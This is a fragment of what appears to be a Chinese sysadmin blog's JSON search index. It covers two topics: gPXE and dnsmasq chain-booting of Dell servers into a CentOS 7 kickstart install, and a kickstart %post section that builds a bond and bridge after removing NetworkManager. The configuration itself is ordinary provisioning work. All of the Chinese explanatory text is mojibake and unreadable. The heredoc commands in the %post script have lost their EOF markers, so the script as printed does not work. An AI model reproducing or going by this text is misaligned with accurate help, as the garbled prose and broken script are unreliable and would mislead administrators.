è‡ªå·±è¦çƒ§ç½‘å¡çš„bootroomç‰‡å­ï¼Œå°±å¾—é€‰æ‹©æ‰€æœ‰é©±åŠ¨äº†ã€‚\u003c/p\u003e\n\u003cp\u003eè¿™æ ·æˆ‘ä»¬ä¼šå¾—åˆ°ä¸€ä¸ª gpxe-1.0.1-undionly.kpxe çš„æ–‡ä»¶ï¼Œä¿å­˜å¤‡ç”¨ã€‚\u003c/p\u003e\n\u003cp\u003eç„¶åæˆ‘ä»¬æ¥è®¾ç½®Dnsmasq:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003elog-dhcp\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edhcp-no-override\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eenable-tftp  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003etftp-root \u003cspan class=\"o\"\u003e=\u003c/span\u003e /tftpboot\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edhcp-range\u003cspan class=\"o\"\u003e=\u003c/span\u003etftp,172.16.36.100,172.16.36.105\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edhcp-match\u003cspan class=\"o\"\u003e=\u003c/span\u003egpxe,175  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edhcp-boot\u003cspan class=\"o\"\u003e=\u003c/span\u003enet:#gpxe,gpxe-1.0.1-undionly.kpxe,gxe/bootserver,172.16.36.1  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edhcp-boot\u003cspan class=\"o\"\u003e=\u003c/span\u003ehttp://172.16.8.1/ks/boot.txt  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eæ³¨æ„ï¼šgpxe-1.0.1-undionly.kpxeæ˜¯æ”¾åœ¨/tftpboot/gpxe/ä¹‹ä¸‹çš„\u003c/p\u003e\n\u003cp\u003eä¸Šé¢æœ‰å¾ˆå¤šç„æœºï¼Œdhcp-rangeæ˜¯éšä¾¿è®¾ä¸€ä¸ªåœ°å€æ± ï¼Œå› ä¸ºæœ€ç»ˆå®é™…æ˜¯gpxeæ¥å†³å®šåœ°å€ï¼Œæ‰€ä»¥ç¬¬ä¸€æ¬¡dhcpå¾—åˆ°çš„åœ°å€åè€Œä¸é‡è¦äº†ã€‚dhcp-no-overrideä¸€å®šè¦æœ‰ï¼Œå¦åˆ™gpxeæœ‰bugï¼Œæ— æ³•å¯åŠ¨ã€‚\u003c/p\u003e\n\u003cp\u003eå…¶æ¬¡åŒ¹é…gpxeï¼Œå‡¡æ˜¯175çš„éƒ½æ˜¯gpxeï¼Œä¸ºä»€ä¹ˆè¦åŒ¹é…å‘¢ï¼Ÿçœ‹ä¸‹é¢ï¼Œæœ‰ä¸¤ä¸ªdhcp-bootå¯åŠ¨é€‰é¡¹ï¼Œ#pxeï¼Œ#è¡¨ç¤ºä¸æ˜¯ï¼Œè¿™è¡Œæ„æ€æ˜¯:ä¸æ˜¯gpxeå¯åŠ¨çš„è¯ç”¨/tftp/gpxe/gpxe-1.0.1-undionly.kpxeæ¥å¯åŠ¨ï¼Œdhcpçš„serveræ˜¯172.16.36.1ã€‚ç¬¬äºŒè¡Œå¦‚æœæ˜¯gpxeå¯åŠ¨çš„è¯ï¼Œå°±chainåˆ°[http://172.16.8.1/ks/boot.txt]å»å¯åŠ¨\u003c/p\u003e\n\u003cp\u003eå‘µå‘µï¼Œå¦‚æœä¸è¿™ä¹ˆè®¾ç½®ï¼Œå°±ç”¨ä¸€è¡Œçš„è¯ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edhcp-boot\u003cspan class=\"o\"\u003e=\u003c/span\u003egpxe-1.0.1-undionly.kpxe,gxe/bootserver,172.16.36.1  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eå°±ä¼šé™·å…¥æ­»å¾ªç¯ï¼Œé¦–å…ˆpxeå¯åŠ¨ï¼ŒæŠ“äº†ä¸ªgpxeï¼Œgpxeåˆå¯åŠ¨æŠ“äº†ä¸ªgpxeï¼ŒåˆæŠ“gpxeï¼Œå¾ªç¯å¾€å¤æ²¡ç©æ²¡äº†ã€‚æ‰€ä»¥å¿…é¡»æ ‡è®°gpxeï¼Œå¹¶è·³å‡ºè¿™ä¸ªå¾ªç¯ã€‚\u003c/p\u003e\n\u003cp\u003eæˆ‘ä»¬åœ¨172.16.8.1ä¸Šé¢å»ºç«‹/centos7çš„yumå®‰è£…æºï¼ŒåŒæ—¶å»ºç«‹/ksç›®å½•ã€‚å‡†å¤‡boot.txtï¼Œboot2.phpï¼Œboot3.phpï¼Œcentos7.kså››ä¸ªæ–‡ä»¶ï¼Œä¸‹é¢ä¸€ä¸ªä¸€ä¸ªè§£é‡Šï¼š\u003c/p\u003e\n\u003cp\u003eé¦–å…ˆæ˜¯boot.txt\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecat boot.txt  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#!gpxe\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003echain http://172.16.8.1/ks/boot2.php?uuid\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"se\"\u003e\\$\u003c/span\u003e\u003cspan class=\"o\"\u003e{\u003c/span\u003euuid\u003cspan class=\"o\"\u003e}\u003c/span\u003e\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"nv\"\u003emac\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"se\"\u003e\\$\u003c/span\u003e\u003cspan class=\"o\"\u003e{\u003c/span\u003emac\u003cspan class=\"o\"\u003e}\u003c/span\u003e\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"nv\"\u003ebusid\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"se\"\u003e\\$\u003c/span\u003e\u003cspan class=\"o\"\u003e{\u003c/span\u003ebusid\u003cspan class=\"o\"\u003e}\u003c/span\u003e\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"nv\"\u003eip\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"se\"\u003e\\$\u003c/span\u003e\u003cspan class=\"o\"\u003e{\u003c/span\u003eip\u003cspan class=\"o\"\u003e}\u003c/span\u003e\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"nv\"\u003ehostname\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"se\"\u003e\\$\u003c/span\u003e\u003cspan class=\"o\"\u003e{\u003c/span\u003ehostname:uristring\u003cspan class=\"o\"\u003e}\u003c/span\u003e\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"nv\"\u003eserial\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"se\"\u003e\\$\u003c/span\u003e\u003cspan class=\"o\"\u003e{\u003c/span\u003eserial:uristring\u003cspan class=\"o\"\u003e}\u003c/span\u003e\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"nv\"\u003easset\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"se\"\u003e\\$\u003c/span\u003e\u003cspan class=\"o\"\u003e{\u003c/span\u003easset:uristring\u003cspan class=\"o\"\u003e}\u003c/span\u003e\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"nv\"\u003emanufacturer\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"se\"\u003e\\$\u003c/span\u003e\u003cspan class=\"o\"\u003e{\u003c/span\u003emanufacturer:uristring\u003cspan class=\"o\"\u003e}\u003c/span\u003e\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"nv\"\u003eproduct\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"se\"\u003e\\$\u003c/span\u003e\u003cspan class=\"o\"\u003e{\u003c/span\u003eproduct:uristring\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eå¤§å®¶çœ‹ä¸Šé¢ï¼Œboot.txtæ˜¯ä¸ªgpxeè„šæœ¬ï¼Œå®é™…æ˜¯è®©gpxeå‘boot2.phpä¼ è¾“äº†ä¸€äº›æ•°æ®è¿‡æ¥ï¼Œæœ‰æœºå™¨çš„uuid/mac/busid/hostname/serial/productç­‰ç­‰ã€‚ç»™ä¸ªå…·ä½“çš„ä¾‹å­ï¼Œä»access.logçœ‹åˆ°å®é™…å‘è¿‡æ¥çš„è¯·æ±‚å¦‚ä¸‹ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e\u0026#34;GET /ks/boot2.php?uuid=%5C44454c4c-5600-1054-8042-b1c04f433532\u0026amp;mac=%5Cec%3Af4%3Abb%3Ad9%3A96%3A40\u0026amp;busid=%5C01%3A80%3A86%3A15%3A21\u0026amp;ip=%5C172.16.36.100\u0026amp;hostname=%5C\u0026amp;serial=%5C1VTBC52\u0026amp;asset=%5C\u0026amp;manufacturer=%5CDell%20Inc.\u0026amp;product=%5CPowerEdge%20R730 HTTP/1.0\u0026#34;\u003c/span\u003e \u003cspan class=\"m\"\u003e200\u003c/span\u003e \u003cspan class=\"m\"\u003e46\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;-\u0026#34;\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;gPXE/1.0.1\u0026#34;\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;-\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eçœ‹ä¸Šé¢ï¼Œæœ‰å¾ˆå¤šä¿¡æ¯ï¼Œç½‘å¡çš„ç‰©ç†åœ°å€ï¼Œè¿˜æœ‰serialï¼Œå¯¹åº”dellå°±æ˜¯svc tagå·ï¼Œè¿˜æœ‰æœºå™¨ç±»åˆ«PowerEdge R730ï¼Œè¿™æ˜¯ä¸ªå¥½ä¸œè¥¿å•Šã€‚\u003c/p\u003e\n\u003cp\u003eæˆ‘ä»¬è´­ä¹°æœºå™¨çš„æ—¶å€™è‚¯å®šæœ‰åºåˆ—å·ï¼Œä¸Šæ¶åˆ°æœºæˆ¿çš„æ—¶å€™ï¼Œå¯ä»¥è®©idcæŠ„ä¸‹æ¥æœºæŸœå’Œåºåˆ—å·ï¼Œç„¶åæˆ‘ä»¬è®©ç½‘ç®¡è§„åˆ’å¥½ipï¼Œå†è¿™é‡Œå°±å¯ä»¥åˆ©ç”¨serialæ¥ç¡®å®šæœºå™¨åº”è¯¥æŒ‰å“ªä¸ªæ¨¡æ¿å®‰è£…ã€‚\u003c/p\u003e","title":"IPXE kickstartå®‰è£…CentOSçš„æ–¹æ³•"},{"content":"å¦‚ä½•åœ¨kickstartè„šæœ¬ä¸­æ—¢é…ç½®brï¼Œåˆé…ç½®bondingå‘¢ï¼Ÿ\nåŸºæœ¬ç¯‡ï¼š ä»¥Dell R730ä¸ºä¾‹ï¼Œç‰©ç†ç½‘å¡åç§°æ˜¯em1/em2/em3/em4\nnetwork --device=br0 --noipv6 --onboot=yes --bridgeslaves=bond0 --gateway=172.16.37.254 --ip=172.16.36.2 --nameserver=172.16.8.1 --netmask=255.255.254.0 --activate network --device=bond0 --noipv6 --onboot=yes --bondslaves=em1,em2 --bondopts=mode=active-backup,balance-rr;primary=em1,miimon=80,updelay=60000 --activate network --device=em1 --noipv6 --nodns --onboot=yes --activate network --device=em2 --noipv6 --nodns --onboot=yes --activate network --device=em3 --noipv6 --nodns --onboot=yes --activate network --device=em4 --noipv6 --nodns --onboot=yes --activate network --hostname=myhost-16-36-2 æ³¨æ„ä»¥ä¸Šï¼Œæ˜¯åªåšäº† em1 å’Œ em2 ç»‘å®šæˆä¸º bond0 ï¼Œç„¶å br0 å¯åŠ¨åœ¨ bond0 ä¹‹ä¸Šã€‚\nè¿›é˜¶ç¯‡ï¼š åŸºæœ¬ç¯‡çš„åšæ³•å›ºç„¶æ˜¯åšäº†å››ç½‘å¡ç»‘å®šå’Œæ¡¥æ¥ï¼Œå‰¯ä½œç”¨ä¹Ÿæ˜¯å¾ˆå¯æ€•çš„ã€‚\nå¤§å®¶å»çœ‹/etc/sysconfig/network-scriptsï¼Œ é‡Œé¢æœ‰ä¸€å †çš„ifcfg-br0-slave_1ï¼Œifcfg-bond0-slave_1ï¼Œ ifcfg-bond0-slave_2ï¼Œæ›´å¯æ¶çš„æ˜¯è¿›ç¨‹ä¸­è·‘ç€å¥½å‡ ä¸ªdhcp-clientï¼Œä¸€æƒ³å°±æ˜ç™½äº†ï¼Œè¿™æ˜¯NetworkManageræå¾—ã€‚em3å’Œem4ä¸æ–­å»å¯åœç«¯å£ï¼Œè¯•å›¾è·å¾—åœ°å€ï¼Œå¯¼è‡´äº¤æ¢æœºç«¯å£å¿½æ–­å¿½é€šã€‚\nè¿™ä¸ªè¯•å›¾è‡ªåŠ¨åŒ–ç½‘ç»œçš„ä¸œè¥¿åœ¨æœåŠ¡å™¨è·‘ä¸Šå®åœ¨æ˜¯å¤ªæ— èŠäº†ã€‚\næ‰€ä»¥ä¸Šé¢çš„åšæ³•æ‘’å¼ƒã€‚åœ¨%postæŠŠç½‘ç»œæå¥½ï¼š\n... %packages @compat-libraries @core wget net-tools chrony bridge-utils %end ... network --bootproto=static --device=em1 --noipv6 --nodns --onboot=yes --gateway=172.16.37.254 --ip=172.16.36.2 --nameserver=172.16.8.1 --netmask=255.255.254.0 network --bootproto=dhcp --device=em2 --noipv6 --nodns --onboot=no network --bootproto=dhcp --device=em3 --noipv6 --nodns --onboot=no network --bootproto=dhcp --device=em4 --noipv6 --nodns --onboot=no network --hostname=myhost-16-36-2 ... %post yum -y erase NetworkManager cat \u0026lt;/etc/sysconfig/network-scripts/ifcfg-br0 DEVICE=br0 TYPE=Bridge BOOTPROTO=static ONBOOT=yes IPADDR=172.16.36.2 NETMASK=255.255.254.0 GATEWAY=172.16.37.254 EOF cat \u0026lt; /etc/modprobe.d/bonding.conf alias bond0 bonding BONDING_OPTS=\u0026#34;miimon=100 mode=1 primary=em1\u0026#34; EOF cat \u0026lt; /etc/sysconfig/network-scripts/ifcfg-bond0 DEVICE=bond0 ONBOOT=yes USERCTL=no BRIDGE=br0 EOF cat \u0026lt; /etc/sysconfig/network-scripts/ifcfg-em1 DEVICE=em1 USERCTL=no ONBOOT=yes MASTER=bond0 SLAVE=yes BRIDGE=\u0026#34;br0\u0026#34; EOF cat \u0026lt; /etc/sysconfig/network-scripts/ifcfg-em2 DEVICE=em2 USERCTL=no ONBOOT=yes MASTER=bond0 SLAVE=yes BRIDGE=\u0026#34;br0\u0026#34; EOF %end æ³¨æ„ä¸Šé¢ï¼Œå®‰è£…åŒ…å¿…é¡»å®‰è£…bridge-utilsï¼Œå¦åˆ™æ²¡æœ‰brctlï¼Œæ— æ³•å¯åŠ¨br0ã€‚\nå…¶æ¬¡æ˜¯å¸è½½äº†NetworkManagerï¼ŒæœåŠ¡å™¨ç½‘ç»œéƒ½æ˜¯æ‰‹åŠ¨é…çš„ï¼Œæ²¡äººç”¨è‡ªåŠ¨åŒ–ç®¡ç†ã€‚\nè¿™æ ·å°±å®Œç¾äº†ã€‚\n","permalink":"https://rendoumi.com/posts/20240118-kickstart_bongding/","summary":"\u003cp\u003eå¦‚ä½•åœ¨\u003ccode\u003ekickstart\u003c/code\u003eè„šæœ¬ä¸­æ—¢é…ç½®brï¼Œåˆé…ç½®bondingå‘¢ï¼Ÿ\u003c/p\u003e\n\u003ch2 id=\"åŸºæœ¬ç¯‡\"\u003eåŸºæœ¬ç¯‡ï¼š\u003c/h2\u003e\n\u003cp\u003eä»¥Dell R730ä¸ºä¾‹ï¼Œç‰©ç†ç½‘å¡åç§°æ˜¯em1/em2/em3/em4\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enetwork  --device\u003cspan class=\"o\"\u003e=\u003c/span\u003ebr0   --noipv6  --onboot\u003cspan class=\"o\"\u003e=\u003c/span\u003eyes --bridgeslaves\u003cspan class=\"o\"\u003e=\u003c/span\u003ebond0 --gateway\u003cspan class=\"o\"\u003e=\u003c/span\u003e172.16.37.254 --ip\u003cspan class=\"o\"\u003e=\u003c/span\u003e172.16.36.2 --nameserver\u003cspan class=\"o\"\u003e=\u003c/span\u003e172.16.8.1 --netmask\u003cspan class=\"o\"\u003e=\u003c/span\u003e255.255.254.0 --activate  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enetwork  --device\u003cspan class=\"o\"\u003e=\u003c/span\u003ebond0 --noipv6  --onboot\u003cspan class=\"o\"\u003e=\u003c/span\u003eyes --bondslaves\u003cspan class=\"o\"\u003e=\u003c/span\u003eem1,em2 --bondopts\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"nv\"\u003emode\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eactive-backup,balance-rr\u003cspan class=\"p\"\u003e;\u003c/span\u003e\u003cspan class=\"nv\"\u003eprimary\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eem1,miimon\u003cspan class=\"o\"\u003e=\u003c/span\u003e80,updelay\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e60000\u003c/span\u003e --activate  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enetwork --device\u003cspan class=\"o\"\u003e=\u003c/span\u003eem1 --noipv6 --nodns --onboot\u003cspan class=\"o\"\u003e=\u003c/span\u003eyes --activate  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enetwork --device\u003cspan class=\"o\"\u003e=\u003c/span\u003eem2 --noipv6 --nodns --onboot\u003cspan class=\"o\"\u003e=\u003c/span\u003eyes --activate  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enetwork --device\u003cspan class=\"o\"\u003e=\u003c/span\u003eem3 --noipv6 --nodns --onboot\u003cspan class=\"o\"\u003e=\u003c/span\u003eyes --activate  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enetwork --device\u003cspan class=\"o\"\u003e=\u003c/span\u003eem4 --noipv6 --nodns --onboot\u003cspan class=\"o\"\u003e=\u003c/span\u003eyes --activate  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enetwork  --hostname\u003cspan class=\"o\"\u003e=\u003c/span\u003emyhost-16-36-2  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eæ³¨æ„ä»¥ä¸Šï¼Œæ˜¯åªåšäº† em1 å’Œ em2 ç»‘å®šæˆä¸º bond0 ï¼Œç„¶å br0 å¯åŠ¨åœ¨ bond0 ä¹‹ä¸Šã€‚\u003c/p\u003e\n\u003ch2 id=\"è¿›é˜¶ç¯‡\"\u003eè¿›é˜¶ç¯‡ï¼š\u003c/h2\u003e\n\u003cp\u003eåŸºæœ¬ç¯‡çš„åšæ³•å›ºç„¶æ˜¯åšäº†å››ç½‘å¡ç»‘å®šå’Œæ¡¥æ¥ï¼Œå‰¯ä½œç”¨ä¹Ÿæ˜¯å¾ˆå¯æ€•çš„ã€‚\u003c/p\u003e\n\u003cp\u003eå¤§å®¶å»çœ‹/etc/sysconfig/network-scriptsï¼Œ é‡Œé¢æœ‰ä¸€å †çš„ifcfg-br0-slave_1ï¼Œifcfg-bond0-slave_1ï¼Œ ifcfg-bond0-slave_2ï¼Œæ›´å¯æ¶çš„æ˜¯è¿›ç¨‹ä¸­è·‘ç€å¥½å‡ ä¸ªdhcp-clientï¼Œä¸€æƒ³å°±æ˜ç™½äº†ï¼Œè¿™æ˜¯NetworkManageræå¾—ã€‚em3å’Œem4ä¸æ–­å»å¯åœç«¯å£ï¼Œè¯•å›¾è·å¾—åœ°å€ï¼Œå¯¼è‡´äº¤æ¢æœºç«¯å£å¿½æ–­å¿½é€šã€‚\u003c/p\u003e\n\u003cp\u003eè¿™ä¸ªè¯•å›¾è‡ªåŠ¨åŒ–ç½‘ç»œçš„ä¸œè¥¿åœ¨æœåŠ¡å™¨è·‘ä¸Šå®åœ¨æ˜¯å¤ªæ— èŠäº†ã€‚\u003c/p\u003e\n\u003cp\u003eæ‰€ä»¥ä¸Šé¢çš„åšæ³•æ‘’å¼ƒã€‚åœ¨%postæŠŠç½‘ç»œæå¥½ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e... \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e%packages \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e@compat-libraries \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e@core \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewget \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enet-tools \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003echrony \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ebridge-utils \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e%end \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e...\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enetwork  --bootproto\u003cspan class=\"o\"\u003e=\u003c/span\u003estatic --device\u003cspan class=\"o\"\u003e=\u003c/span\u003eem1 --noipv6 --nodns  --onboot\u003cspan class=\"o\"\u003e=\u003c/span\u003eyes --gateway\u003cspan class=\"o\"\u003e=\u003c/span\u003e172.16.37.254 --ip\u003cspan class=\"o\"\u003e=\u003c/span\u003e172.16.36.2  --nameserver\u003cspan class=\"o\"\u003e=\u003c/span\u003e172.16.8.1 --netmask\u003cspan class=\"o\"\u003e=\u003c/span\u003e255.255.254.0 \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enetwork  --bootproto\u003cspan class=\"o\"\u003e=\u003c/span\u003edhcp --device\u003cspan class=\"o\"\u003e=\u003c/span\u003eem2 --noipv6 --nodns --onboot\u003cspan class=\"o\"\u003e=\u003c/span\u003eno \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enetwork  --bootproto\u003cspan class=\"o\"\u003e=\u003c/span\u003edhcp --device\u003cspan class=\"o\"\u003e=\u003c/span\u003eem3 --noipv6 --nodns --onboot\u003cspan class=\"o\"\u003e=\u003c/span\u003eno \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enetwork  --bootproto\u003cspan class=\"o\"\u003e=\u003c/span\u003edhcp --device\u003cspan class=\"o\"\u003e=\u003c/span\u003eem4 --noipv6 --nodns --onboot\u003cspan class=\"o\"\u003e=\u003c/span\u003eno \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enetwork  --hostname\u003cspan class=\"o\"\u003e=\u003c/span\u003emyhost-16-36-2 \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e...\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e%post \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e yum -y erase NetworkManager \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e cat \u0026lt;/etc/sysconfig/network-scripts/ifcfg-br0 \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e \u003cspan class=\"nv\"\u003eDEVICE\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003ebr0 \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e \u003cspan class=\"nv\"\u003eTYPE\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eBridge \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e \u003cspan class=\"nv\"\u003eBOOTPROTO\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003estatic \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e \u003cspan class=\"nv\"\u003eONBOOT\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eyes \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e \u003cspan class=\"nv\"\u003eIPADDR\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e172.16.36.2 \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e \u003cspan class=\"nv\"\u003eNETMASK\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e255.255.254.0 \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e \u003cspan class=\"nv\"\u003eGATEWAY\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e172.16.37.254 \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e EOF \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e cat \u0026lt; /etc/modprobe.d/bonding.conf \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e \u003cspan class=\"nb\"\u003ealias\u003c/span\u003e bond0 bonding \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e \u003cspan class=\"nv\"\u003eBONDING_OPTS\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;miimon=100 mode=1 primary=em1\u0026#34;\u003c/span\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan 